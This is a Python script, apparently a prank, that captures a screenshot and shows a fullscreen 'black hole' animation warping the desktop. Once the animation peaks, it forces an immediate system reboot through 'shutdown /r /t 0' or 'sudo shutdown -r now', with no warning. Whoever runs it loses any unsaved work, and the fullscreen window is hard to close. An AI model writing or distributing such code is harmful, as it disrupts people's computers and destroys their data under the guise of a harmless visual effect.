import pygame
import sys
import math
import mss
import numpy as np
import os
import platform

# -----------------------------
# Step 1: Take screenshot first
# -----------------------------
with mss.mss() as sct:
    monitor = sct.monitors[0]  # full screen
    img = np.array(sct.grab(monitor))[:, :, :3].astype(np.uint8)  # RGB only

# Get screen dimensions from screenshot
HEIGHT, WIDTH = img.shape[0], img.shape[1]

# Transpose for Pygame (width, height, 3)
img = np.transpose(img, (1, 0, 2))

# -----------------------------
# Step 2: Initialize Pygame fullscreen
# -----------------------------
pygame.init()
screen = pygame.display.set_mode((WIDTH, HEIGHT), pygame.FULLSCREEN)
clock = pygame.time.Clock()

# Convert screenshot to Pygame surface
background = pygame.surfarray.make_surface(img.copy())

# -----------------------------
# Step 3: Black hole parameters
# -----------------------------
BLACK = (0, 0, 0)
ORANGE = (255, 140, 0)

radius = 0
max_radius = math.hypot(WIDTH/2, HEIGHT/2)
speed = 2
expand = True
horizon_thickness = 20
pulse_speed = 0.05
warp_strength = 0.3

# Precompute coordinates
y_indices, x_indices = np.meshgrid(np.arange(HEIGHT), np.arange(WIDTH))
cx, cy = WIDTH/2, HEIGHT/2
dx = x_indices - cx
dy = y_indices - cy
distances = np.hypot(dx, dy) + 1e-5

# -----------------------------
# Step 4: Main loop
# -----------------------------
running = True
restart_triggered = False

while running:
    for event in pygame.event.get():
        if event.type == pygame.QUIT:
            pygame.quit()
            sys.exit()

    # Draw background
    screen.blit(background, (0, 0))

    # Event horizon pulse
    pulse = (math.sin(pygame.time.get_ticks() * pulse_speed) + 1)/2
    glow_radius = int(radius + horizon_thickness + pulse * 10)
    pygame.draw.circle(screen, ORANGE, (WIDTH//2, HEIGHT//2), glow_radius, 3)

    # Warp effect around black hole (nested loop for correctness)
    arr = pygame.surfarray.pixels3d(screen)
    step = 2  # skip pixels for performance
    for i in range(0, WIDTH, step):
        for j in range(0, HEIGHT, step):
            dist = distances[i, j]
            if dist < radius + horizon_thickness * 2:
                factor = 1 - warp_strength * (radius / (dist + 1))
                nx = int(cx + dx[i, j] * factor)
                ny = int(cy + dy[i, j] * factor)
                nx = max(0, min(WIDTH-1, nx))
                ny = max(0, min(HEIGHT-1, ny))
                arr[i, j] = img[nx, ny]
    del arr

    # Draw black hole core
    pygame.draw.circle(screen, BLACK, (WIDTH//2, HEIGHT//2), int(radius))

    # Expand/shrink logic
    if expand:
        radius += speed
        if radius >= max_radius:
            expand = False
            restart_triggered = True
    else:
        radius -= speed
        if radius <= 0:
            expand = True

    pygame.display.flip()
    clock.tick(60)

    # -----------------------------
    # Step 5: Restart PC if triggered
    # -----------------------------
    if restart_triggered:
        system = platform.system()
        if system == "Windows":
            os.system("shutdown /r /t 0")
        elif system in ["Linux", "Darwin"]:
            os.system("sudo shutdown -r now")
        restart_triggered = False
